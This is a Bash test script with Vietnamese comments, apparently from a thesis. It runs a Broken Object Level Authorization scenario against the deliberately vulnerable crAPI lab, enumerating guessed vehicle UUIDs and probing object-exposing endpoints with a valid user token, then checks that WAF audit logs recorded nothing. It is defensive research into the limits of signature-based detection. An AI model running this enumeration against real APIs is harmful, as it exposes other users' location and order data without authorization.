#!/usr/bin/env bash
# KỊCH BẢN — BOLA / Broken Object Level Authorization (OWASP API1:2023)
#
# Đây là PHÉP ĐO ĐỐI CHỨNG trung tâm của luận văn (A2 KEHOACH-THAYDOI-HETHONG.md):
#   - BOLA là lỗ hổng TẦNG ỨNG DỤNG của crAPI, GIỮ NGUYÊN có chủ đích (HE-THONG §5).
#   - Người dùng hợp lệ (testuser01, crapi-user, token Keycloak hợp lệ, thiết bị
#     browser) truy cập ĐỐI TƯỢNG của người khác: GET /identity/api/v2/vehicle/{id}/location.
#   - Request KHÔNG chứa payload injection nào → chữ ký CRS/ModSecurity KHÔNG
#     bắt được gì. Đây chính là luận điểm: phương pháp dựa-trên-chữ-ký mù với
#     lớp tấn công vượt quyền; lớp Zero-Trust (mТLS + service_acl + RBAC + OPA)
#     và mô hình ML (Giai đoạn C) mới là phần xử lý được.
#
# NGHIỆM THU của script này:
#   1. Các request BOLA đi tới được ứng dụng (không bị chặn ở TLS/biên) — đúng
#      như kỳ vọng, ZTA không vá lỗ hổng app.
#   2. WAF audit log (job=waf-audit) KHÔNG có bản ghi nào cho các path BOLA này.
#   Output thô của phép đo #2 in ra stdout để lưu vào repo.
set -uo pipefail
SCENARIO="crapi_bola"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$HERE/lib/crapi_common.sh"
crapi_preflight

J="$(crapi_login testuser01 'Test1234!')"
trap 'rm -f "$J"' EXIT
log "Đăng nhập testuser01 (crapi-user, token hợp lệ, thiết bị browser)"

# Lấy vehicle của chính mình (nếu có) để có 1 UUID thật, rồi thử các UUID khác.
declare -a _tls_opts; mapfile -t _tls_opts < <(crapi_curl_tls_opts)
own_json="$(curl -s -A "$BROWSER_UA" "${_tls_opts[@]}" -b "$J" --max-time 20 "$BFF_URL/identity/api/v2/vehicle/vehicles" || true)"
own_uuid="$(printf '%s' "$own_json" | grep -oE '[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}' | head -1)"
log "vehicle của testuser01: ${own_uuid:-<none>}"

# Tập UUID để thử BOLA: của mình + vài UUID "đoán" (enumeration cổ điển của crAPI).
declare -a TARGETS=()
[[ -n "$own_uuid" ]] && TARGETS+=("$own_uuid")
TARGETS+=(
  "649acfac-10ea-4c8f-b1d1-7f2b3f7f0001"
  "649acfac-10ea-4c8f-b1d1-7f2b3f7f0002"
  "00000000-0000-4000-8000-000000000001"
  "11111111-1111-4111-8111-111111111111"
)

echo "---- BOLA requests (HTTP code) ----"
reached=0
for u in "${TARGETS[@]}"; do
  for ep in "location" "" ; do
    path="/identity/api/v2/vehicle/${u}/${ep}"
    code="$(crapi_call "$J" GET "$path")"
    printf '  GET %-58s -> %s\n' "$path" "$code"
    # 2xx/4xx từ ứng dụng = request tới được app (không bị chặn ở biên/TLS)
    [[ "$code" =~ ^(200|401|403|404|422|500)$ ]] && reached=$((reached + 1))
  done
done
# Vài endpoint rò rỉ đối tượng khác của crAPI (mass-assignment / object exposure)
for path in \
  "/identity/api/v2/user/dashboard" \
  "/community/api/v2/community/posts/recent" \
  "/workshop/api/shop/orders/all" ; do
  code="$(crapi_call "$J" GET "$path")"
  printf '  GET %-58s -> %s\n' "$path" "$code"
done

[[ $reached -ge 1 ]] || fail "không request BOLA nào tới được ứng dụng — có gì đó chặn ở biên (không mong đợi)"
log "Các request BOLA tới được ứng dụng ($reached) — ZTA không vá lỗ hổng app (đúng chủ đích)"

sleep 4
echo "---- ĐO ĐỐI CHỨNG: CRS/WAF audit cho path BOLA ----"
crs_bola="$(loki_count '{job="waf-audit"} |~ "vehicle/[^/]+/location"')"
crs_any="$(loki_count '{job="waf-audit"} |~ "attack-"')"
crs_total="$(loki_count '{job="waf-audit"} |~ "\"transaction\""')"
echo "  CRS hit trên path BOLA (vehicle/{id}/location)   = $crs_bola   [kỳ vọng 0]"
echo "  CRS hit gắn tag tấn công (attack-*) trong 10m     = $crs_any"
echo "  CRS transaction audited tổng trong 10m            = $crs_total"

if [[ "$crs_bola" != "0" ]]; then
  fail "$SCENARIO — CRS GHI NHẬN $crs_bola bản ghi trên kịch bản BOLA — điều tra: script có gửi payload bất thường? CRS bắt nhầm? (xem KEHOACH: đây là dấu hiệu bất thường)"
fi

pass "$SCENARIO — BOLA tới được app; CRS/ModSecurity KHÔNG ghi nhận gì trên kịch bản này (số đo đối chứng = 0)"
